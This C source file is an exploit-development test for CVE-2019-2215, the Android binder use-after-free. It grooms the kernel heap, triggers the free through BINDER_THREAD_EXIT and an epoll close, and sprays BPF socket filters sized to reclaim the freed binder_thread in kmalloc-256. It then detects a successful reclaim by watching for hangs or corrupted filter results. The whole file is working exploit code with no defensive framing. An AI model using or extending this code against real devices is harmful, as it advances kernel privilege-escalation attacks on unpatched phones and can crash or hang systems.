/*
 * bpf_reclaim_k256.c — CVE-2019-2215 reclaim targeting CORRECT slab (k256)
 *
 * CRITICAL FIX: binder_thread is 252 bytes → kmalloc-256 (from kernel disasm).
 * Previous tests used 20 BPF insns → kmalloc-192 (WRONG CACHE!).
 * Now using 26 BPF insns → header + 208 = 220-228 → kmalloc-256 (CORRECT!).
 *
 * Dual detection:
 * 1. Hang detection: all LD_IMM insns → internal code 30. At offset 44:
 *    owner=30, next=0 → LOCKED → hang if reclaimed
 * 2. Filter corruption: RET_K at spinlock offset (jt=1,jf=0 → unlocked).
 *    After UAF: code changes to RET_A → returns A=42 → ACCEPT
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  0x40046208
#define BINDER_SET_MAX_THREADS 0x40046205
#define NUM_INSNS 26  /* 26 insns → k256 to match binder_thread */

/* Test: hang detection with LD_IMM at all positions */
static int test_hang_spray(int spray_count, int groom_count) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    /* Groom with binder_threads (kfree, immediate) */
    int groom_bfd[300], groom_epfd[300];
    int ng = 0;
    for (int i = 0; i < groom_count && i < 300; i++) {
        groom_bfd[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (groom_bfd[i] < 0) break;
        uint32_t mx = 0; ioctl(groom_bfd[i], BINDER_SET_MAX_THREADS, &mx);
        groom_epfd[i] = epoll_create1(O_CLOEXEC);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(groom_epfd[i], EPOLL_CTL_ADD, groom_bfd[i], &ev);
        ng++;
    }
    for (int i = ng - 1; i >= 0; i--) {
        int thr = 0; ioctl(groom_bfd[i], BINDER_THREAD_EXIT, &thr);
        close(groom_epfd[i]);
    }
    
    /* Target */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    uint32_t mx = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    int thr = 0; ioctl(bfd, BINDER_THREAD_EXIT, &thr);
    
    /* BPF spray — all LD_IMM (code=30 internally → spinlock LOCKED → hang) */
    int *fds = malloc(spray_count * sizeof(int));
    struct sock_filter insns[NUM_INSNS];
    memset(insns, 0, sizeof(insns));
    for (int j = 0; j < NUM_INSNS - 1; j++) {
        insns[j].code = 0x00; /* LD_IMM → internal BPF_S_LD_IMM=30 */
        insns[j].k = 0xDEAD0000 + j;
    }
    insns[NUM_INSNS-1].code = 0x06; insns[NUM_INSNS-1].k = 0xFFFF;
    struct sock_fprog prog = { .len = NUM_INSNS, .filter = insns };
    
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] < 0) break;
        if (setsockopt(fds[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0) {
            close(fds[i]); fds[i] = -1; break;
        }
        created++;
    }
    
    close(epfd); /* UAF trigger */
    
    for (int i = 0; i < created; i++) close(fds[i]);
    free(fds); close(bfd);
    for (int i = 0; i < ng; i++) close(groom_bfd[i]);
    return 0;
}

/* Test: filter corruption with RET_K at spinlock offset */
static int test_filter_spray(int spray_count, int port_base) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    uint32_t mx = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    int thr = 0; ioctl(bfd, BINDER_THREAD_EXIT, &thr);
    
    /* Spray with RET_K at position 3 AND 4 (covers both header=12 and header=20)
     * insns[3] = RET_K: for header=20, at offset 44 (spinlock-compatible)
     * insns[4] = RET_K: for header=12, at offset 44 (spinlock-compatible)
     * The earlier RET_K terminates the filter. If header=20: returns at insns[3].
     * If header=12: returns at insns[3] (offset 36, NOT at spinlock).
     *
     * To cover header=12: use insns[0-3]=LD_IMM, insns[4]=RET_K
     * To cover header=20: use insns[0-2]=LD_IMM, insns[3]=RET_K
     * Can't do both simultaneously. Run separate sub-tests. */
    
    /* Sub-test: insns[0-3]=LD_IMM, insns[4]=RET_K (for header=12) */
    int *fds = malloc(spray_count * sizeof(int));
    struct sockaddr_in *addrs = malloc(spray_count * sizeof(struct sockaddr_in));
    
    struct sock_filter det[NUM_INSNS];
    memset(det, 0, sizeof(det));
    for (int j = 0; j < 4; j++) { det[j].code = 0x00; det[j].k = 42; }
    det[4].code = 0x06; det[4].jt = 1; det[4].jf = 0; det[4].k = 0;
    for (int j = 5; j < NUM_INSNS-1; j++) { det[j].code = 0x06; det[j].k = 0; }
    det[NUM_INSNS-1].code = 0x06; det[NUM_INSNS-1].k = 0xFFFF;
    struct sock_fprog prog = { .len = NUM_INSNS, .filter = det };
    
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] < 0) break;
        memset(&addrs[i], 0, sizeof(addrs[i]));
        addrs[i].sin_family = AF_INET;
        addrs[i].sin_addr.s_addr = htonl(0x7F000001);
        addrs[i].sin_port = htons(port_base + i);
        if (bind(fds[i], (struct sockaddr*)&addrs[i], sizeof(addrs[i])) < 0 ||
            setsockopt(fds[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0) {
            close(fds[i]); fds[i] = -1; break;
        }
        struct timeval tv = { .tv_sec = 0, .tv_usec = 5000 };
        setsockopt(fds[i], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        created++;
    }
    
    close(epfd); /* UAF */
    
    int sender = socket(AF_INET, SOCK_DGRAM, 0);
    int detected = 0;
    for (int i = 0; i < created; i++) {
        char m[] = "T";
        sendto(sender, m, 1, 0, (struct sockaddr*)&addrs[i], sizeof(addrs[i]));
        char b[4];
        if (recv(fds[i], b, sizeof(b), 0) > 0) detected++;
    }
    
    close(sender);
    for (int i = 0; i < created; i++) if (fds[i] >= 0) close(fds[i]);
    free(fds); free(addrs); close(bfd);
    return detected;
}

int main() {
    printf("=== CVE-2019-2215 Reclaim — k256 (CORRECT cache!) ===\n");
    printf("binder_thread = 252 bytes → k256\n");
    printf("BPF 26 insns → k256\n\n");
    
    /* TEST A: Hang detection with mass spray */
    printf("--- TEST A: Hang detection (LD_IMM, 26 insns) ---\n");
    struct { int spray; int groom; } configs[] = {
        {100, 0}, {500, 0}, {100, 100}, {500, 100}
    };
    for (int c = 0; c < 4; c++) {
        int hangs = 0, ok = 0;
        for (int i = 0; i < 30; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(5);
                test_hang_spray(configs[c].spray, configs[c].groom);
                _exit(0);
            }
            int status; waitpid(pid, &status, 0);
            if (WIFSIGNALED(status) && WTERMSIG(status) == 14) {
                hangs++;
                if (hangs <= 3) printf("  HANG! spray=%d groom=%d attempt=%d\n",
                    configs[c].spray, configs[c].groom, i);
            } else ok++;
        }
        printf("  spray=%3d groom=%3d: %d hangs / 30\n",
               configs[c].spray, configs[c].groom, hangs);
    }
    
    /* TEST B: Filter corruption with spray */
    printf("\n--- TEST B: Filter corruption (RET_K at insns[4], 26 insns) ---\n");
    for (int spray = 100; spray <= 500; spray += 200) {
        int total = 0;
        for (int i = 0; i < 20; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(10);
                int d = test_filter_spray(spray, 40000 + i * 600);
                _exit(d > 0 ? 1 : 0);
            }
            int status; waitpid(pid, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) > 0) {
                total++;
                printf("  CORRUPTED! spray=%d attempt=%d\n", spray, i);
            }
        }
        printf("  spray=%3d: %d/20 detected\n", spray, total);
    }
    
    printf("\n=== Done ===\n");
    return 0;
}
